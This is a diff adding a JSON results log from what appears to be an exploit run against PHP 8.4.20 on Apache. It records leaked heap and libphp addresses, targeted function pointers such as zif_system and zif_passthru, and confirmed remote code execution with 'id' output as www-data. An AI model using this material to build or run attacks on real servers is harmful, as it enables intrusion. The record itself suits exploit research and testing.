@@ -1,0 +1,39 @@
+{
+  "profile": "php-8.4.20-amd64",
+  "effective_memory_limit_mb": 8,
+  "tried_memory_limits_mb": [
+    "8"
+  ],
+  "off_a_pad_calibration": {
+    "coarse_4mib": 0,
+    "mid_128kib": 0,
+    "fine4k_count": 0,
+    "x_extra_count": 0,
+    "x2_extra_count": 0
+  },
+  "apache_worker_count": 1,
+  "parked_worker_count": 0,
+  "worker_affinity": "single-prefork-worker",
+  "address_source_1": "heap-b HTTP Set-Cookie",
+  "address_source_2": "libphp-b HTTP Set-Cookie",
+  "cached_heap": "0x705300a00000",
+  "main_heap": "0x705300e00000",
+  "safe_basedir": "0x705300e55030",
+  "pDestructor": "0x7053016f47e0",
+  "libphp_base": "0x7053010c5000",
+  "htdata": "0x705300e690d8",
+  "zif_system": "0x705301501360",
+  "zif_passthru": "0x705301501370",
+  "terminal_dispatch": "0x70530158ba49",
+  "zend_bailout": "0x7053012616fc",
+  "aslr_draw_favourable": true,
+  "terminal": "two-callback passthru/bailout",
+  "terminal_http_status": 200,
+  "http_body_complete": true,
+  "command": "id",
+  "status": "RCE_OUTPUT_OBSERVED",
+  "command_output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n",
+  "command_output_bytes": 54,
+  "command_output_sha256": "6d99797c5e70f1676baffdaab9979d52aef4d97cb7c457054182abe6e4075c1e",
+  "command_output_source": "rce-b HTTP body"
+}
